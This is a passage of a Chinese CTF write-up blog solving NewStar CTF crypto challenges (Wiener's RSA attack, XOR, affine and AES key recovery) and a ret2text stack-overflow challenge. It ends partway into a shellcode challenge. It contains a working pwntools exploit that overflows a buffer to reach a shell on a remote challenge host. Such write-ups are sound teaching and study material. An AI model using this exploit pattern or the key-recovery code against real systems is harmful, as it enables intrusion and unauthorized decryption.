class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rational_to_contfrac</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Converts a rational x/y fraction into</span><br><span class="hljs-string">    a list of partial quotients [a0, ..., an]</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    a = x//y<br>    pquotients = [a]<br>    <span class="hljs-keyword">while</span> a * y != x:<br>        x,y = y,x-a*y<br>        a = x//y<br>        pquotients.append(a)<br>    <span class="hljs-keyword">return</span> pquotients<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convergents_from_contfrac</span>(<span class="hljs-params">frac</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    computes the list of convergents</span><br><span class="hljs-string">    using the list of partial quotients</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    convs = [];<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(frac)):<br>        convs.append(contfrac_to_rational(frac[<span class="hljs-number">0</span>:i]))<br>    <span class="hljs-keyword">return</span> convs<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contfrac_to_rational</span> (frac):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an]</span><br><span class="hljs-string">     to an x/y rational.</span><br><span class="hljs-string">     &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(frac) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>    num = frac[-<span class="hljs-number">1</span>]<br>    denom = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">2</span>,-<span class="hljs-built_in">len</span>(frac)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        num, denom = frac[_]*num+denom, num<br>    <span class="hljs-keyword">return</span> (num,denom)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Extended Euclidean Algorithm</span><br><span class="hljs-string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    u, u1 = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    v, v1 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b:<br>        q = a // b<br>        u, u1 = u1, u - q * u1<br>        v, v1 = v1, v - q * v1<br>        a, b = b, a - q * b<br>    <span class="hljs-keyword">return</span> u, v, a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    2.8 times faster than egcd(a,b)[2]</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    a,b=(b,a) <span class="hljs-keyword">if</span> a&lt;b <span class="hljs-keyword">else</span> (a,b)<br>    <span class="hljs-keyword">while</span> b:<br>        a,b=b,a%b<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modInverse</span>(<span class="hljs-params">e,n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    d such that de = 1 (mod n)</span><br><span class="hljs-string">    e must be coprime to n</span><br><span class="hljs-string">    this is assumed to be true</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> egcd(e,n)[<span class="hljs-number">0</span>]%n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">totient</span>(<span class="hljs-params">p,q</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the totient of pq</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitlength</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the bitlength of x</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">assert</span> x &gt;= <span class="hljs-number">0</span><br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> x &gt; <span class="hljs-number">0</span>:<br>        n = n+<span class="hljs-number">1</span><br>        x = x&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isqrt</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the integer square root</span><br><span class="hljs-string">    for arbitrary large nonnegative integers</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;square root not defined for negative numbers&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    a, b = <span class="hljs-built_in">divmod</span>(bitlength(n), <span class="hljs-number">2</span>)<br>    x = <span class="hljs-number">2</span>**(a+b)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        y = (x + n//x)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> y &gt;= x:<br>            <span class="hljs-keyword">return</span> x<br>        x = y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_perfect_square</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    If n is a perfect square it returns sqrt(n),</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    otherwise returns -1</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    h = n &amp; <span class="hljs-number">0xF</span>; <span class="hljs-comment">#last hexadecimal &quot;digit&quot;</span><br>    <br>    <span class="hljs-keyword">if</span> h &gt; <span class="hljs-number">9</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span> <span class="hljs-comment"># return immediately in 6 cases out of 16.</span><br><br>    <span class="hljs-comment"># Take advantage of Boolean short-circuit evaluation</span><br>    <span class="hljs-keyword">if</span> ( h != <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">5</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">7</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">8</span> ):<br>        <span class="hljs-comment"># take square root if you must</span><br>        t = isqrt(n)<br>        <span class="hljs-keyword">if</span> t*t == n:<br>            <span class="hljs-keyword">return</span> t<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wiener_hack</span>(<span class="hljs-params">e, n</span>):<br>    frac = rational_to_contfrac(e, n)<br>    convergents = convergents_from_contfrac(frac)<br>    <span class="hljs-keyword">for</span> (k, d) <span class="hljs-keyword">in</span> convergents:<br>        <span class="hljs-keyword">if</span> k != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (e * d - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:<br>            phi = (e * d - <span class="hljs-number">1</span>) // k<br>            s = n - phi + <span class="hljs-number">1</span><br>            discr = s * s - <span class="hljs-number">4</span> * n<br>            <span class="hljs-keyword">if</span> (discr &gt;= <span class="hljs-number">0</span>):<br>                t = is_perfect_square(discr)<br>                <span class="hljs-keyword">if</span> t != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (s + t) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hacked!&quot;</span>)<br>                    <span class="hljs-keyword">return</span> d<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    n = <span class="hljs-number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br>    e = <span class="hljs-number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br>    c = <span class="hljs-number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br>    d = wiener_hack(e, n)<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span> (long_to_bytes(m))<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>拿到flag：<code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p>
<h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>打开附件，得到一段python：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure>

<p>由于已知flag是<code>flag&#123;</code>开头的，所以我们可以得到key的值，编写解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext_hex = <span class="hljs-string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span><br><br><span class="hljs-comment"># 将16进制字符串转换为字节列表</span><br>ciphertext_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br><br><span class="hljs-comment"># 解密密文</span><br>plaintext = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext_bytes:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(c))^<span class="hljs-number">143</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment">#plaintext.append(c ^ key)</span><br><br><span class="hljs-comment"># 将字节列表转换为字符串</span><br>plaintext_str = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> plaintext])<br><br><span class="hljs-built_in">print</span>(plaintext_str)<br></code></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p>
<h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>使用cyberchef，第一段得到<code>flag&#123;dazzling_encoding#4e0ad4</code>，第二段得到：<code>f0ca08d1e1d0f10c0c7afe422fea7</code>，第三段使用UUencode解密<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/uuencode">UUencode加密&#x2F;解密 - Bugku CTF</a>，得到<code>c55192c992036ef623372601ff3a&#125;</code>。</p>
<p>拼接一下，得到flag：<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p>
<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>附件一段python</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, key<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % <span class="hljs-number">256</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br></code></pre></td></tr></table></figure>

<p>因为flag前4个字母是flag，因此可以列出4个方程</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">221</span>+<span class="hljs-number">256</span>*a=key0*<span class="hljs-number">102</span>+key1<br><span class="hljs-attribute">67</span>+<span class="hljs-number">256</span>*b=key0*<span class="hljs-number">108</span>+key1<br><span class="hljs-attribute">136</span>+<span class="hljs-number">256</span>*c=key0*<span class="hljs-number">97</span>+key1<br><span class="hljs-attribute">238</span>+<span class="hljs-number">256</span>*d=key0*<span class="hljs-number">103</span>+key1<br></code></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key0</span> = (<span class="hljs-number">52</span> + <span class="hljs-number">256</span> * (a - b + c - d)) / -<span class="hljs-number">12</span><br><span class="hljs-attribute">key1</span> = <span class="hljs-number">221</span> + <span class="hljs-number">256</span> * a - key0 * <span class="hljs-number">102</span><br></code></pre></td></tr></table></figure>

<p>测试猜测key0&#x3D;17，key1&#x3D;23</p>
<p>解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 密文和密钥</span><br>ciphertext_hex = <span class="hljs-string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span><br>key = (<span class="hljs-number">17</span>, <span class="hljs-number">23</span>)  <span class="hljs-comment"># 请将a和b替换为实际的密钥值</span><br><br><span class="hljs-comment"># 计算key[0]的模数逆</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_inverse</span>(<span class="hljs-params">a, m</span>):<br>    m0, x0, x1 = m, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> a &gt; <span class="hljs-number">1</span>:<br>        q = a // m<br>        m, a = a % m, m<br>        x0, x1 = x1 - q * x0, x0<br>    <span class="hljs-keyword">return</span> x1 + m0 <span class="hljs-keyword">if</span> x1 &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x1<br><br><span class="hljs-comment"># 将密文转换为字节列表</span><br>ciphertext_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br>flag = []<br><br><span class="hljs-comment"># 逆向解密</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext_bytes:<br>    original_byte = ((c - key[<span class="hljs-number">1</span>]) * mod_inverse(key[<span class="hljs-number">0</span>], <span class="hljs-number">256</span>)) % <span class="hljs-number">256</span><br>    flag.append(original_byte)<br><br><span class="hljs-comment"># 将解密后的字节列表转换为字符串</span><br>original_flag = <span class="hljs-built_in">bytes</span>(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(original_flag)<br></code></pre></td></tr></table></figure>

<p>得到flag：<code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p>
<h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>打开附件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> data + <span class="hljs-string">b&quot;&quot;</span>.join([<span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(data))])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    flag_ = pad(flag)<br>    key = os.urandom(<span class="hljs-number">16</span>) * <span class="hljs-number">2</span><br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="hljs-number">1</span>)<br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    enc_flag = aes.encrypt(flag_)<br>    <span class="hljs-built_in">print</span>(enc_flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span><br><span class="hljs-comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br></code></pre></td></tr></table></figure>

<p>key是<strong>32bytes</strong>,<strong>256bits</strong> ；iv是<strong>16bytes ,128bits</strong></p>
<p>key^iv ，那么只有 iv 与 key的<strong>低128位</strong>相异或，所以<strong>key的高128位是固定不变的</strong>。所以输出结果的高128bits,就是key的高128bits,进而可以得到key的所有值256bits。</p>
<p>之后key的低128bits，与输出结果的低128bits相异或，所得结果就是iv的值了</p>
<p>解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><br>xor = <span class="hljs-number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>^<span class="hljs-number">1</span><br>enc_flag = <span class="hljs-string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br>out = long_to_bytes(xor)<br>key = out[:<span class="hljs-number">16</span>]*<span class="hljs-number">2</span><br><span class="hljs-comment"># print(key)</span><br>iv = bytes_to_long(key[<span class="hljs-number">16</span>:])^bytes_to_long(out[<span class="hljs-number">16</span>:])<br><span class="hljs-comment"># print(iv)</span><br>iv = long_to_bytes(iv)<br><span class="hljs-comment"># print(iv)</span><br>aes = AES.new(key,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc_flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p>得到<code>b&#39;firsT_cry_Aes\x00\x00\x00&#39;</code></p>
<p>flag：<code>flag&#123;firsT_cry_Aes&#125;</code></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>3&#x2F;5</p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>栈溢出</p>
<p>ida打开发现明显的栈溢出，而且还有后门backdoor()函数</p>
<p>反汇编代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>backdoor代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>backdoor地址00000000004011FB</p>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>return_address = <span class="hljs-number">0x4011FB</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span><br><br><span class="hljs-comment"># 构造payload</span><br>payload = padding + p64(return_address)<br><br><span class="hljs-comment"># 连接目标服务</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27081</span>)<br>r.recvline()<br>r.recvline()<br><span class="hljs-comment"># 发送payload</span><br>r.sendline(payload)<br><br><span class="hljs-comment"># 接收响应</span><br>r.interactive()<br></code></pre></td></tr></table></figure>

<p>之后直接cat flag即可拿到flag：<code>flag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125;</code></p>
<h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  init(argc, argv, envp);<br>  buf = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span 